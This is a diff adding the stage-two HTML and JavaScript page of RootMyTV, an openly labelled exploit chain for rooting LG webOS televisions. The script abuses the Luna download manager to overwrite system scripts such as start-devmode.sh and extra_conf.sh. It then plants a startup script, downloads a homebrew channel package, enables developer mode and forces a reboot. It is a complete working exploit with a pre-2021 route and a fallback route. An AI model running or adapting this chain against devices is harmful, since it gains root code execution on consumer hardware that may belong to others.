@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>RootMyTV - Stage 2</title>
+  <link rel="stylesheet" href="css/common.css" />
+</head>
+
+<body>
+  <header>
+    <h1>RootMy.TV<small> 2.0</small></h1>
+  </header>
+  <hr>
+  <section class="content-center">
+    <article>
+      <pre id="log"></pre>
+    </article>
+  </section>
+  <hr>
+  <script src="lib/webOSTV.js"></script>
+  <script>
+    // Break out of an iframe...
+    if (window !== window.top) {
+      window.top.location.href = location.href
+    }
+  </script>
+  <script>
+    function log(str) {
+      var logBox = document.querySelector('#log');
+      logBox.innerText = logBox.innerText + str + '\n';
+      logBox.scrollIntoView(false)
+    }
+
+    window.onerror = function (err) {log('Unexpected error: ' + err);};
+
+    (function () {
+      function download(url, targetDir, targetFilename, success, failure) {
+        var target = new URL(url, window.location.href).href;
+        log(targetFilename + ': Downloading from ' + target + '...');
+        webOS.service.request('luna://com.webos.service.downloadmanager', {
+          method: 'download',
+          parameters: {
+            target: target,
+            targetDir: targetDir,
+            targetFilename: targetFilename,
+            subscribe: true,
+          },
+
+          onSuccess: function (res) {
+            if (res.completed === true) {
+              if (res.destPath !== targetDir) {
+                if (failure != undefined) {
+                  failure(res);
+                } else {
+                  log(targetFilename + ': Download completed, but target directory (' + res.destPath + ') did not match what we expected (' + targetDir + '). This likely means your TV is not vulnerable to LunaDownloadMgr exploit.');
+                }
+              } else if (res.httpStatus !== 200) {
+                log(targetFilename + ': Download completed, but finished with a HTTP status code ' + res.httpStatus);
+              } else {
+                log(targetFilename + ': Download completed');
+                success();
+              }
+            }
+          },
+
+          onFailure: function (err) {
+            log(targetFilename + ': Luna call failed: ' + JSON.stringify(err));
+
+            if (failure != undefined) {
+              failure(err);
+            }
+          },
+        });
+      }
+
+      function reboot() {
+        webOS.service.request('luna://com.webos.service.sleep', {
+          method: 'shutdown/machineReboot',
+          parameters: {
+            reason: "remoteKey"
+          },
+          onSuccess: function (res) {
+            log("Reboot request succeeded. Bye?");
+          },
+          onFailure: function (res) {
+            log("Failed to reboot: " + JSON.stringify(res));
+          },
+        });
+      }
+
+      var homebrewChannelURL = 'https://github.com/webosbrew/webos-homebrew-channel/releases/download/v0.4.0/org.webosbrew.hbchannel_0.4.0_all.ipk';
+
+      function bootstrapStage3() {
+        download('files/stage3.sh', '/mnt/lg/cmn_data/var/lib/webosbrew/', 'startup.sh', function () {
+          download(homebrewChannelURL, '/mnt/lg/appstore/internal/downloads/', 'hbchannel.ipk', function () {
+            download('files/dummy', '/mnt/lg/cmn_data/var/luna/preferences/', 'devmode_enabled', function () {
+              log("Your TV shall reboot in 5 seconds...");
+              setTimeout(function () {
+                reboot();
+              }, 5000);
+            });
+          });
+        });
+      }
+
+      // Attempt to go through original pre-2021/06 route. This will fail on patched TVs.
+      download('files/jumpstart.sh', '/media/cryptofs/apps/usr/palm/services/com.palmdts.devmode.service/', 'start-devmode.sh', function () {
+        log("Original start-devmode.sh overwrite succeeded, using original chain...");
+        bootstrapStage3();
+      }, function () {
+        log("Original start-devmode.sh overwrite failed, attempting v2 exploit...");
+        download('files/jumpstart.sh', '/mnt/lg/cmn_data/wam/', 'extra_conf.sh', function () {
+          bootstrapStage3();
+        });
+      });
+    })();
+  </script>
+</body>
+
+</html>
